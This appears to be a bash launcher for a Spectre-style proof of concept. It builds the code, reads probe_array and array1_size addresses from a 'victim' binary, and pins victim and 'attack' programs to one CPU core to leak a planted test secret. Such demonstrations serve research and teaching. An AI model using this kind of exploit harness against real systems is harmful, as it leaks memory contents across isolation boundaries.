#!/bin/bash

make > /dev/null || exit -1

if ! taskset -V &> /dev/null
then
    echo "'taskset' command could not be found !"
    echo "Please install it first (may be the in the 'util-linux' package)"
    exit 1
fi

cd poc

SECRET_OFFSET=64
echo "###################################################"
echo "Using secret_value_offset "${SECRET_OFFSET}"."
echo "The expected read secret is 'Hello there ! General Kenobi !"
echo "###################################################"

VICTIM_BASE=$(readelf -l victim | grep LOAD | head -n 1 | awk '{print $3}')
PROBE_ARRAY_ADDR=$(objdump -d victim -j .rodata | grep '<probe_array>' | awk '{print $1}')
ARRAY1_SIZE_ADDR=$(objdump -d victim -j .rodata | grep '<array1_size>' | awk '{print $1}')

taskset -c 0 ./victim | taskset -c 0 ./attack ${SECRET_OFFSET} ${VICTIM_BASE} 0x${PROBE_ARRAY_ADDR} 0x${ARRAY1_SIZE_ADDR}

cd ..
